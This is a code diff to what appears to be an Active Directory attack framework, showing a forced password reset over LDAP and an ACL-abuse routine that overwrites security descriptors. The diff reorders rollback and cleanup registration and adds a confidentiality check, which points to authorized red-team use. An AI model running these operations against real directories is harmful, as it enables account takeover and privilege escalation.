@@ -171,17 +171,20 @@ class ForceChangePassword:
         require_force("force-change-password", force)
         sam = require_param(kwargs, "sam", "write_target", "target")
         password = require_param(kwargs, "new_password", "password", "value")
+        from adaf_attack.core.ldap_ops import require_confidentiality
+
+        require_confidentiality(target, "force-change-password")
         conn, base_dn, _cfg = ldap_connect(target)
         try:
             dn, _entry = _lookup_or_raise(conn, base_dn, sam)
             encoded = encode_unicode_pwd(password)
-            ok = bool(conn.modify(dn, {"unicodePwd": [(MODIFY_REPLACE, [encoded])]}))
             register_advisory_rollback(
                 session,
                 kind="password-reset",
                 target=dn,
                 rollback="The previous password is not recoverable; reset it through an authorized process.",
             )
+            ok = bool(conn.modify(dn, {"unicodePwd": [(MODIFY_REPLACE, [encoded])]}))
             result: dict[str, Any] = {
                 "ok": ok,
                 "sam": sam,
@@ -288,17 +291,17 @@ def _operator_sid(conn: Any, base_dn: str, target: Target, kwargs: dict[str, Any
 
 
 def _write_sd(conn: Any, session: Session, dn: str, previous: bytes | None, new_sd: bytes) -> bool:
-    ok = bool(conn.modify(dn, {"nTSecurityDescriptor": [(MODIFY_REPLACE, [new_sd])]}))
-    if ok:
-        session.register_cleanup(
-            {
-                "kind": "acl",
-                "target": dn,
-                "previous_hex": (previous or b"").hex(),
-                "rollback": "Restore original nTSecurityDescriptor.",
-            }
-        )
-    return ok
+    from adaf_attack.core.acl import modify_security_descriptor
+
+    session.register_cleanup(
+        {
+            "kind": "acl",
+            "target": dn,
+            "previous_hex": (previous or b"").hex(),
+            "rollback": "Restore original nTSecurityDescriptor.",
+        }
+    )
+    return bool(modify_security_descriptor(conn, dn, new_sd))
 
 
 @register_from_catalog("acl-abuse")
